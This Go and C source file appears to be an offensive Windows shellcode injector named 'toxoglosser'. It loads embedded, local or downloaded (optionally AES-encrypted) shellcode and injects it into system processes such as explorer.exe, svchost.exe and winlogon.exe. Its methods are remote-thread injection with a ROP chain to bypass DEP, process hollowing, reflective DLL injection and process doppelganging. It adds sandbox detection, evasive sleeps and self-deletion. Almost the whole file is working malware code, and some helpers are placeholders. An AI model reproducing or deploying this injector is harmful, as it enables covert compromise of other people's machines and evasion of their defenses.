// toxoglosser_enhanced.go (Enhanced Go + C + ASM with embedded shellcode)
package main

/*
#cgo LDFLAGS: -lpsapi -lntdll
#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winnt.h>
#include <ntstatus.h>

// Remove redefinitions since they're already in the system headers

// Function to check if a process is suitable for injection
BOOL IsProcessSuitable(DWORD pid) {
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (hProcess == NULL) {
		return FALSE;
	}
	
	// Check architecture (ensure it matches)
	BOOL isWow64;
	IsWow64Process(hProcess, &isWow64);
	if (isWow64) {
		// Skip 32-bit processes on 64-bit system if targeting 64-bit
		CloseHandle(hProcess);
		return FALSE;
	}
	
	CloseHandle(hProcess);
	return TRUE;
}

// Enhanced function to get process ID by name with additional checks
DWORD GetProcessIdByNameEnhanced(const char* processName) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	BOOL bResult = Process32First(hSnapshot, &pe32);

	while (bResult) {
		if (_stricmp(pe32.szExeFile, processName) == 0) {
			if (IsProcessSuitable(pe32.th32ProcessID)) {
				CloseHandle(hSnapshot);
				return pe32.th32ProcessID;
			}
		}
		bResult = Process32Next(hSnapshot, &pe32);
	}

	CloseHandle(hSnapshot);
	return 0;
}

// Advanced process enumeration that finds best candidates
DWORD FindBestProcessForInjection(LPCSTR* preferredProcessList, int count) {
	for (int i = 0; i < count; i++) {
		DWORD pid = GetProcessIdByNameEnhanced(preferredProcessList[i]);
		if (pid != 0) {
			return pid;
		}
	}
	return 0;
}

// Function to find a gadget signature within a module
LPVOID find_gadget(HMODULE hModule, const char* signature, size_t sig_len) {
	if (hModule == NULL) {
		return NULL;
	}

	MODULEINFO moduleInfo;
	if (!GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo))) {
		return NULL;
	}

	char* base_addr = (char*)moduleInfo.lpBaseOfDll;
	size_t module_size = moduleInfo.SizeOfImage;

	for (size_t i = 0; i < module_size - sig_len; i++) {
		if (memcmp(&base_addr[i], signature, sig_len) == 0) {
			return (LPVOID)(&base_addr[i]);
		}
	}
	return NULL;
}

// Enhanced ROP chain generation with multiple fallbacks
BOOL GenerateEnhancedROPChain(HANDLE hProcess, LPVOID shellcodeAddr, DWORD shellcodeSize, LPVOID* ropChainAddr, DWORD* ropChainSize) {
	HMODULE hNtdll = GetModuleHandle("ntdll.dll");
	if (hNtdll == NULL) {
		return FALSE;
	}

	// Primary gadget signatures
	char pop_rcx_ret[] = {0x59, 0xc3};
	char pop_rdx_ret[] = {0x5a, 0xc3};
	char pop_r8_ret[]  = {0x41, 0x58, 0xc3};
	char pop_r9_ret[]  = {0x41, 0x59, 0xc3};
	char ret[] = {0xc3};

	LPVOID pop_rcx = find_gadget(hNtdll, pop_rcx_ret, sizeof(pop_rcx_ret));
	LPVOID pop_rdx = find_gadget(hNtdll, pop_rdx_ret, sizeof(pop_rdx_ret));
	LPVOID pop_r8  = find_gadget(hNtdll, pop_r8_ret, sizeof(pop_r8_ret));
	LPVOID pop_r9  = find_gadget(hNtdll, pop_r9_ret, sizeof(pop_r9_ret));
	LPVOID ret_gadget = find_gadget(hNtdll, ret, sizeof(ret));

	// Fallback to ret if specific pop gadgets not found
	if (pop_rcx == NULL) pop_rcx = ret_gadget;
	if (pop_rdx == NULL) pop_rdx = ret_gadget;
	if (pop_r8 == NULL) pop_r8 = ret_gadget;
	if (pop_r9 == NULL) pop_r9 = ret_gadget;

	if (pop_rcx == NULL || pop_rdx == NULL || pop_r8 == NULL || pop_r9 == NULL) {
		return FALSE;
	}

	LPVOID virtual_protect_addr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
	if (virtual_protect_addr == NULL) {
		return FALSE;
	}

	// Construct the ROP chain on the heap
	*ropChainSize = 8 * 12; // Increased size for more complex chain
	UINT64* rop_chain = (UINT64*)malloc(*ropChainSize);
	if (rop_chain == NULL) {
		return FALSE;
	}

	DWORD oldProtect;
	LPVOID oldProtectAddr = VirtualAllocEx(hProcess, NULL, sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if(oldProtectAddr == NULL) {
		free(rop_chain);
		return FALSE;
	}

	int i = 0;
	rop_chain[i++] = (UINT64)pop_rcx;           // pop rcx; ret
	rop_chain[i++] = (UINT64)shellcodeAddr;     // 1st arg: lpAddress
	rop_chain[i++] = (UINT64)pop_rdx;           // pop rdx; ret
	rop_chain[i++] = (UINT64)shellcodeSize;     // 2nd arg: dwSize
	rop_chain[i++] = (UINT64)pop_r8;            // pop r8; ret
	rop_chain[i++] = (UINT64)PAGE_EXECUTE_READWRITE; // 3rd arg: flNewProtect
	rop_chain[i++] = (UINT64)pop_r9;            // pop r9; ret
	rop_chain[i++] = (UINT64)oldProtectAddr;    // 4th arg: lpflOldProtect
	rop_chain[i++] = (UINT64)virtual_protect_addr;  // Call VirtualProtect
	rop_chain[i++] = (UINT64)shellcodeAddr;     // Jump to shellcode

	*ropChainAddr = rop_chain;
	return TRUE;
}

// Function to check if we're in a sandboxed environment
BOOL IsSandboxEnvironment() {
	DWORD count = 0;
	GetLogicalDriveStrings(0, NULL);
	DWORD drives = GetLogicalDriveStrings(256, (LPSTR)&count);
	return (drives < 3); // If there are less than 3 drives, likely a sandbox
}

// Function to add delays for evasion
void EvasionDelay() {
	Sleep(2000); // 2-second delay for initial evasion
}
*/
import "C"
import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"
	_ "embed"

	"golang.org/x/sys/windows"
	"toxoglosser/core"
	"toxoglosser/evasion"
	"toxoglosser/payloads"
	"toxoglosser/utils"
)

//go:embed shell.bin
var shellcode []byte

const (
	PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xFFF
	MEM_COMMIT         = 0x1000
	MEM_RESERVE        = 0x2000
	MEM_COMMIT_RESERVE = MEM_COMMIT | MEM_RESERVE
	PAGE_READWRITE     = 0x04
	PAGE_EXECUTE_READ  = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
)

// Global variables for configuration
var (
	defaultProcessList = []string{
		"explorer.exe",
		"svchost.exe", 
		"services.exe",
		"spoolsv.exe",
		"winlogon.exe",
		"dwm.exe",
		"csrss.exe",
	}
)


// Function to perform environment checks for evasions
func performEnvironmentChecks() bool {
	// Use the enhanced sandbox detection
	if evasion.IsSandboxEnvironment() {
		fmt.Println("[-] Sandbox environment detected, exiting")
		return false
	}

	// Add additional checks here
	fmt.Println("[+] Environment checks passed")
	return true
}

// Enhanced injection function with better error handling
func injectEnhanced(pid C.DWORD, processName string, payload []byte) bool {
	if pid == 0 {
		fmt.Fprintf(os.Stderr, "[-] Could not find process '%s'.\n", processName)
		return false
	}

	fmt.Printf("[+] Found target process '%s' with PID: %d\n", processName, int(pid))

	// Open the target process with ALL_ACCESS rights
	hProcess, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to open process %s (%d): %v\n", processName, int(pid), err)
		return false
	}
	defer syscall.CloseHandle(hProcess)
	fmt.Printf("[+] Obtained handle to process %s (%d)\n", processName, int(pid))

	// Use direct syscalls instead of LazyDLL
	// Allocate memory in target process for shellcode
	addr := uintptr(0)
	size := uintptr(len(payload))
	err = core.NtAllocateVirtualMemory(windows.Handle(hProcess), &addr, 0, &size, core.MEM_COMMIT_RESERVE, core.PAGE_READWRITE)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to allocate memory in %s (%d): %v\n", processName, int(pid), err)
		return false
	}
	shellcodeAddr := addr
	fmt.Printf("[+] Allocated %d bytes at 0x%x in %s (%d)\n", len(payload), shellcodeAddr, processName, int(pid))

	// Write shellcode to target process using direct syscall
	err = core.NtWriteVirtualMemory(windows.Handle(hProcess), shellcodeAddr, unsafe.Pointer(&payload[0]), uintptr(len(payload)), nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to write shellcode to %s (%d): %v\n", processName, int(pid), err)
		return false
	}
	fmt.Printf("[+] Wrote %d bytes of shellcode to %s (%d)\n", len(payload), processName, int(pid))

	// Generate enhanced ROP chain to bypass DEP
	var ropChainAddr C.LPVOID
	var ropChainSize C.DWORD
	if C.GenerateEnhancedROPChain((C.HANDLE)(unsafe.Pointer(hProcess)), C.LPVOID(shellcodeAddr), C.DWORD(len(payload)), &ropChainAddr, &ropChainSize) == C.FALSE {
		fmt.Fprintf(os.Stderr, "[-] Failed to generate enhanced ROP chain for %s (%d).\n", processName, int(pid))
		return false
	}
	defer C.free(unsafe.Pointer(ropChainAddr))
	fmt.Printf("[+] Successfully generated enhanced ROP chain for %s (%d)\n", processName, int(pid))

	// Allocate memory for ROP chain using direct syscall
	ropSize := uintptr(ropChainSize)
	ropAddr := uintptr(0)
	err = core.NtAllocateVirtualMemory(windows.Handle(hProcess), &ropAddr, 0, &ropSize, core.MEM_COMMIT_RESERVE, core.PAGE_READWRITE)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to allocate memory for ROP chain in %s (%d): %v\n", processName, int(pid), err)
		return false
	}
	ropMem := ropAddr
	fmt.Printf("[+] Allocated %d bytes for ROP chain at 0x%x in %s (%d)\n", uintptr(ropChainSize), ropMem, processName, int(pid))

	// Write ROP chain to target process using direct syscall
	err = core.NtWriteVirtualMemory(windows.Handle(hProcess), ropMem, unsafe.Pointer(ropChainAddr), uintptr(ropChainSize), nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to write ROP chain to %s (%d): %v\n", processName, int(pid), err)
		return false
	}
	fmt.Printf("[+] Successfully wrote ROP chain to %s (%d)\n", processName, int(pid))

	// Create remote thread to execute ROP chain - use CreateRemoteThread via manual resolution
	// Note: CreateRemoteThread is a kernel32 function without a direct syscall equivalent
	// so we'll use the manual API resolution approach instead of LazyDLL
	createRemoteThreadAddr, err := core.ManualGetProcAddress("kernel32.dll", "CreateRemoteThread")
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to resolve CreateRemoteThread: %v\n", err)
		return false
	}

	hThread, _, threadErr := syscall.Syscall6(
		createRemoteThreadAddr,
		6,
		uintptr(hProcess),
		0,
		0,
		ropMem, // Start of the ROP chain
		0,
		0,
	)

	if hThread == 0 {
		fmt.Fprintf(os.Stderr, "[-] Failed to create remote thread in %s (%d): %v\n", processName, int(pid), threadErr)
		return false
	}

	fmt.Printf("[+] Payload injected into %s (%d). Mission accomplished.\n", processName, int(pid))
	return true
}

// executeInjection calls the appropriate injection function based on the selected technique
func executeInjection(technique string, pid C.DWORD, processName string, payload []byte) bool {
	if pid == 0 {
		fmt.Fprintf(os.Stderr, "[-] Could not find process '%s'.\n", processName)
		return false
	}

	fmt.Printf("[+] Found target process '%s' with PID: %d\n", processName, int(pid))

	// Convert C.DWORD PID to Windows Handle
	hProcess, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to open process %s (%d): %v\n", processName, int(pid), err)
		return false
	}
	defer syscall.CloseHandle(hProcess)
	fmt.Printf("[+] Obtained handle to process %s (%d)\n", processName, int(pid))

	switch technique {
	case "classic":
		// Use the classic injection (with ROP chain)
		return injectEnhanced(pid, processName, payload)
	case "hollow":
		// Use process hollowing technique
		targetPath := getProcessPathFromPID(uint32(pid))
		if targetPath == "" {
			fmt.Fprintf(os.Stderr, "[-] Failed to get process path for PID %d\n", int(pid))
			return false
		}
		err := core.ProcessHollow(targetPath, payload)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Process hollowing failed for %s (%d): %v\n", processName, int(pid), err)
			return false
		}
		fmt.Printf("[+] Payload injected into %s (%d) via process hollowing. Mission accomplished.\n", processName, int(pid))
		return true
	case "reflect":
		// Use reflective DLL injection (if payload is a DLL)
		// For this implementation, we'll treat the payload as DLL bytes
		err := core.TrueReflectiveInject(windows.Handle(hProcess), payload)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Reflective injection failed for %s (%d): %v\n", processName, int(pid), err)
			return false
		}
		fmt.Printf("[+] Payload injected into %s (%d) via reflective injection. Mission accomplished.\n", processName, int(pid))
		return true
	case "doppel":
		// Use process doppelganging technique
		targetPath := getProcessPathFromPID(uint32(pid))
		if targetPath == "" {
			fmt.Fprintf(os.Stderr, "[-] Failed to get process path for PID %d\n", int(pid))
			return false
		}
		err := core.ProcessDoppelganging(targetPath, payload)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Process doppelganging failed for %s (%d): %v\n", processName, int(pid), err)
			return false
		}
		fmt.Printf("[+] Payload injected into %s (%d) via process doppelganging. Mission accomplished.\n", processName, int(pid))
		return true
	default:
		// Default to classic injection
		fmt.Printf("[*] Unknown technique '%s', defaulting to classic injection\n", technique)
		return injectEnhanced(pid, processName, payload)
	}
}

// getProcessPathFromPID gets the executable path from a process ID
func getProcessPathFromPID(pid uint32) string {
	// This is a simplified implementation
	// In a full implementation, this would query the process to get its executable path

	// For now, we'll just return a common target process path
	// A real implementation would use QueryFullProcessImageName or similar

	// The actual implementation would require more complex Windows API calls
	// like OpenProcess, QueryFullProcessImageName, etc.
	return "C:\\Windows\\System32\\svchost.exe" // Placeholder
}

// Function to select appropriate process from a list
func selectProcess(processList []string) C.DWORD {
	for _, processName := range processList {
		fmt.Printf("[*] Hunting for '%s'...\n", processName)
		pid := C.GetProcessIdByNameEnhanced(C.CString(processName))
		if pid != 0 {
			fmt.Printf("[+] Found suitable process: %s (PID: %d)\n", processName, int(pid))
			return pid
		}
	}
	return 0
}

// Function to profile a process before injection
func profileProcess(pid C.DWORD, processName string) bool {
	// In a real implementation, this would check process stability,
	// privileges, and other factors to determine if it's a good target
	fmt.Printf("[*] Profiling process %s (PID: %d) before injection\n", processName, int(pid))
	
	// Simulate profiling delay
	time.Sleep(500 * time.Millisecond)
	
	return true
}

func main() {
	// Perform initial environment checks
	if !performEnvironmentChecks() {
		os.Exit(1)
	}

	// Throttle execution with obfuscated sleep to avoid detection
	utils.AdvancedSleepWithObfuscation(2 * time.Second)

	if runtime.GOARCH != "amd64" {
		fmt.Fprintln(os.Stderr, "[-] This tool requires an x64 architecture.")
		os.Exit(1)
	}

	// --- Command-line flag parsing ---
	shellcodeFile := flag.String("file", "", "Path to the shellcode file to execute.")
	shellcodeURL := flag.String("url", "", "URL to fetch the shellcode from.")
	shellcodeKey := flag.String("key", "", "Key to decrypt shellcode if encrypted.")
	targetProcessName := flag.String("pname", "", "Name of the target process.")
	targetPidFlag := flag.Int("pid", 0, "PID of the target process.")
	verbose := flag.Bool("v", false, "Enable verbose output.")
	
	// Add flag for alternative process hunting
	alternativeHunt := flag.Bool("ah", false, "Use alternative process hunting technique.")
	injectionTechnique := flag.String("technique", "classic", "Injection technique to use: classic, apc, hollow, doppel, reflect")
	selfDelete := flag.Bool("selfdelete", false, "Delete the executable after execution.")

	flag.Parse()

	// Set random seed for any randomization needed
	rand.Seed(time.Now().UnixNano())

	if *verbose {
		fmt.Println("[*] Verbose mode enabled")
	}

	// --- Payload selection ---
	var payload []byte
	var err error

	if *shellcodeURL != "" {
		fmt.Printf("[*] Downloading payload from URL: %s\n", *shellcodeURL)
		resp, err := http.Get(*shellcodeURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to download shellcode: %v\n", err)
			os.Exit(1)
		}
		defer resp.Body.Close()
		payload, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to read shellcode from response: %v\n", err)
			os.Exit(1)
		}
	} else if *shellcodeFile != "" {
		fmt.Printf("[*] Loading payload from file: %s\n", *shellcodeFile)
		payload, err = ioutil.ReadFile(*shellcodeFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to read shellcode file: %v\n", err)
			os.Exit(1)
		}
	} else {
		fmt.Println("[*] Using embedded payload.")
		payload = shellcode
	}

	// Decrypt payload if a key was provided
	if *shellcodeKey != "" {
		fmt.Println("[*] Decrypting payload...")
		keyBytes := make([]byte, 32) // AES-256
		copy(keyBytes, []byte(*shellcodeKey))
		payload, err = payloads.DecryptPayload(payload, keyBytes)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to decrypt shellcode: %v\n", err)
			os.Exit(1)
		}
	}

	if len(payload) == 0 {
		fmt.Fprintln(os.Stderr, "[-] No shellcode to execute. Provide a URL, file, or embed one.")
		os.Exit(1)
	}

	// --- Target process selection and injection ---
	injected := false
	
	// Shuffle the default process list to avoid predictable patterns
	shuffledProcesses := make([]string, len(defaultProcessList))
	copy(shuffledProcesses, defaultProcessList)
	if *alternativeHunt {
		// Use a different order for alternative hunting
		for i := len(shuffledProcesses) - 1; i > 0; i-- {
			j := rand.Intn(i + 1)
			shuffledProcesses[i], shuffledProcesses[j] = shuffledProcesses[j], shuffledProcesses[i]
		}
	}

	if *targetPidFlag != 0 {
		// Target a specific PID
		pid := C.DWORD(*targetPidFlag)
		if profileProcess(pid, fmt.Sprintf("PID:%d", pid)) {
			injected = executeInjection(*injectionTechnique, pid, fmt.Sprintf("PID:%d", pid), payload)
		}
	} else if *targetProcessName != "" {
		// Target a specific process name
		pid := C.GetProcessIdByNameEnhanced(C.CString(*targetProcessName))
		if pid != 0 && profileProcess(pid, *targetProcessName) {
			injected = executeInjection(*injectionTechnique, pid, *targetProcessName, payload)
		}
	} else {
		// Hunt for a suitable process from the shuffled list
		fmt.Println("[*] No target specified. Hunting for a suitable process...")
		pid := selectProcess(shuffledProcesses)

		if pid != 0 {
			// Get the process name for profiling
			var targetName string
			for _, name := range shuffledProcesses {
				if C.GetProcessIdByNameEnhanced(C.CString(name)) == pid {
					targetName = name
					break
				}
			}

			if profileProcess(pid, targetName) {
				if executeInjection(*injectionTechnique, pid, targetName, payload) {
					injected = true
				}
			}
		}
	}

	if !injected {
		fmt.Fprintln(os.Stderr, "[-] Injection failed. No suitable target process was found or could be injected into.")
		os.Exit(1)
	}
	
	// Add some delay to avoid immediate detection
	if *verbose {
		fmt.Println("[*] Injection completed successfully, exiting after delay")
	}
	time.Sleep(1000 * time.Millisecond)

	// Self-delete if the flag was set
	if *selfDelete {
		fmt.Println("[*] Attempting self-deletion...")
		err := utils.SelfDeleteImmediate()
		if err != nil {
			// Don't fail if self-deletion fails, just warn
			fmt.Printf("[-] Self-deletion failed: %v\n", err)
		} else {
			fmt.Println("[+] Scheduled for self-deletion")
		}
	}
}